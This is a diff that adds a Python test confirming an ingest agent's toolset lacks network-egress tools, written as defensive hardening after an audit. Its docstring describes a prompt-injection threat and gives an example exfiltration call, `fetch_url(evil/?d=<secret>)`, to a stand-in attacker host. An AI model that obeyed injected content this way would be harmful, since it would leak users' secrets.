@@ -55,6 +55,17 @@ def test_ingest_toolset_stays_scoped() -> None:
         assert banned not in ingest
 
 
+def test_ingest_toolset_has_no_network_egress() -> None:
+    """B1 (2026-07-07 audit): ingested content is untrusted (a source file may
+    carry prompt-injection). The ingest agent must have NO network-egress tool,
+    so an injected `fetch_url(evil/?d=<secret>)` has no channel — closing the
+    M203-opened bypass of the M198 egress gate. URL sources are pre-fetched by
+    the CLI (wrapped untrusted) instead."""
+    ingest = TOOLSETS["ingest"]
+    assert "fetch_url" not in ingest
+    assert "web_search" not in ingest
+
+
 # ---------- include resolution ----------
 
 
